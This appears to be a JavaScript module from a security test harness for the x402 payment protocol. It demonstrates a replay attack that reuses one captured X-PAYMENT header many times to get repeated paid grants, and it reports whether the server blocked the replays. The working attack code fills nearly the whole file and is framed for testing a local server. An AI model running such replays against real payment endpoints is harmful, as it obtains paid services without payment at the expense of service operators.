'use strict';
/**
 * ATTACK 1 — REPLAY  ·  kill-chain stage 3 ("how is the payment proven?")
 *
 * Real-world anchor: "Five Attacks on x402" (arXiv 2605.11781) achieved
 * 248 grants from a SINGLE payment against a live endpoint (strongest round of
 * 1,000 concurrent requests, settling on Base Sepolia). The X-PAYMENT
 * header is a bearer token; if the server neither records the nonce nor binds
 * the payment to the request, one signed authorization buys unlimited access.
 *
 * Demo: pay once, capture the header, replay it N times, count the grants.
 */

const { payAndFetch } = require('../buyer/agent');
const { newAccount } = require('../lib/x402');

async function run(baseURL, replays = 5) {
  const buyer = newAccount('victim-agent');

  // One legitimate, correctly-bound payment.
  const first = await payAndFetch(baseURL, buyer, { bind: true });
  const captured = first.paymentHeader;

  let grants = first.status === 200 ? 1 : 0;
  const results = [first.status];

  // Replay the captured bearer header — no new payment, no new signature.
  for (let i = 0; i < replays; i++) {
    const r = await fetch(baseURL + '/research', { headers: { 'X-PAYMENT': captured } });
    results.push(r.status);
    if (r.status === 200) grants++;
  }

  const attempts = replays + 1;
  const succeeded = grants > 1; // more than the one payment we actually made
  return {
    attack: 'replay',
    attempts, grants, paidFor: 1,
    statuses: results,
    succeeded,
    verdict: succeeded
      ? `BROKEN — 1 payment bought ${grants} grants (${attempts - grants} rejected)`
      : `BLOCKED — 1 payment bought 1 grant; ${attempts - grants} replays rejected`,
  };
}

module.exports = { run };

if (require.main === module) {
  run(process.argv[2] || 'http://localhost:4021').then(r => {
    console.log(JSON.stringify(r, null, 2));
  });
}
